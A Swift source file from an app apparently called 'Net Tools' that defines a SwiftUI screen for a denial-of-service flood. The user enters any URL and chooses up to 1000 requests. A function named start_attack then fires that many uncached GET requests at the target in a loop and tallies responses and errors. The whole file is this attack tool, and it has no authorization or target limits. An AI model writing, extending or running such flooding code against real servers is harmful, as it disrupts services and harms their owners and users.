//
//  DOSView.swift
//  Net Tools
//
//  Created by Paul Spencer on 6/16/21.
//

import Foundation
import SwiftUI

struct DOSView: View {
    @State var server_url = "https://test.com"
    @State var status_text = ""
    @State private var num_requests = 0
    @State private var requests_made = 0
    @State private var num_responses = 0
    @State private var num_errors = 0
    
    func start_attack() {
        num_responses = 0
        requests_made = 0
        num_errors = 0
        status_text = ""
        while requests_made != num_requests {
            requests_made += 1
            make_request()
        }
    }
    
    func make_request() {
        let url = URL(string: server_url)!
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        
        let config = URLSessionConfiguration.default
        config.requestCachePolicy = .reloadIgnoringCacheData
        config.urlCache = nil
        let session = URLSession.init(configuration: config)
        let task = session.dataTask(with: request) { (data, response, error) in
            if let error = error {
                status_text = "Something went wrong: \(error.localizedDescription)"
                num_errors += 1
            } else if data == nil {
                status_text = "Something unexpected happened"
                num_errors += 1
            }
            num_responses += 1
        }
        task.resume()
    }
    
    var body: some View {
        VStack {
            TextField("Enter url", text: $server_url)
            .padding()
            HStack {
                Picker("Number of requests to make", selection: $num_requests) {
                    ForEach(0...1000, id:\.self) {
                        Text("\($0)")
                    }
                }
                Button {
                    start_attack()
                } label: {
                    Text("Start")
                }
                .buttonStyle(DefaultButtonStyle())
            
            }.padding()
            Text("Status:\n\(status_text)")
            Text("Responses received: \(num_responses)/\(requests_made)")
            Text("Error responses: \(num_errors)/\(num_responses)")
        }.padding()
    }
}
